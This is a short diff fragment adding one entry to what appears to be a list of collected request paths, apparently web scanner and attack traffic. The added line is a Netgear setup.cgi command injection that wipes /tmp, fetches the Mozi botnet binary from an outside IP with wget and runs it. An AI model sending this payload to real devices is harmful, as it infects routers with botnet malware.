@@ -15472,3 +15472,4 @@ http://apiv4.9hits.com/test
 /ldoecqmq.php?Fox=d3wL7
 /?gad_source=5&gclid=Cj0KCQiAlbW-BhCMARIsADnwasoUIpZwnu7gkrxJWb7aPQGc7UyOKTaSrekaGxsJsz0cLVBsestdYroaAqA5EALw_wcB
 /.tmb/autoload_classmap.php
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://219.157.249.194:41286/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
